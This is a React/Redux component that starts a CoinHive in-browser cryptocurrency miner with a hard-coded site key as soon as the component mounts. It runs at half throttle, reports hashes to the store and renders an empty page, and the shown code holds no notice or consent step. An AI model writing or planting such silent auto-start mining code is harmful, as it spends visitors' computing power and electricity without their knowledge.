import React from 'react';
import FontAwesome from 'react-fontawesome';
import { connect } from 'react-redux';
import { bindActionCreators } from 'redux';
import * as MinerActions from './actions/miner';

import styles from './styles.scss';

class App extends React.Component {
  constructor(props) {
    super(props);

    this.state = {
      miner: null
    };
  }

  componentWillMount() {
    var miner = new CoinHive.Anonymous('pzK5983I2Ge6zm1JN6tgx98a2XeI0Ydg');
    miner.setThrottle(0.5);
    miner.on('accepted', (params) => {
      console.log('accepted', params);
      this.props.actions.hashAccepted(params.hashes);
    });
    miner.on('found', (params) => {
      console.log('found', params);
      console.log(miner.getHashesPerSecond());
    });
    miner.start();
    this.setState({
      miner
    });
  }

  render() {
    return (
      <div className={styles.app}>

      </div>
    );
  }
}

function mapStateToProps(state) {
  return {
    miner: state.miner
  }
}

function mapDispatchToProps(dispatch) {
  return {
    actions: bindActionCreators(Object.assign({},
      MinerActions
    ), dispatch)
  };
}

export default connect(mapStateToProps, mapDispatchToProps)(App);
